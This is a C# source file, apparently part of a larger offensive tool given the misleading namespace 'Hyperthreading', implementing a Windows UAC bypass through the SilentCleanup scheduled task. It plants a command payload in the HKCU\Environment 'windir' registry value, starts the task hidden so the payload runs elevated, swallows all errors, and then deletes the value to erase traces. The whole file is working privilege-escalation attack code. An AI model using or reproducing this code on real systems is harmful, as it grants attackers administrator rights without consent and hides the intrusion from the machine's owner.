using System;
using Microsoft.Win32;
using System.Diagnostics;

namespace Hyperthreading
{
    class SilentCleanup
    {
        static void ExecuteBypass(string payload)
        {
            try
            {
                RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey(@"Environment");
                key.SetValue("windir", "cmd.exe /k " + payload + " & ", RegistryValueKind.String);
                key.Close();
            }
            catch
            {
            }

            System.Threading.Thread.Sleep(5000);

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.FileName = "schtasks.exe";
                startInfo.Arguments = @"/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I";
                Process.Start(startInfo);

            }
            catch
            {
            }

            DeleteKey();

        }

        static void DeleteKey()
        {
            System.Threading.Thread.Sleep(5000);

            try
            {
                var rkey = Registry.CurrentUser.OpenSubKey(@"Environment", true);

                // Validate if the Key Exist
                if (rkey != null)
                {
                    try
                    {
                        rkey.DeleteValue("windir");
                        rkey.Close();
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
        }
    }
}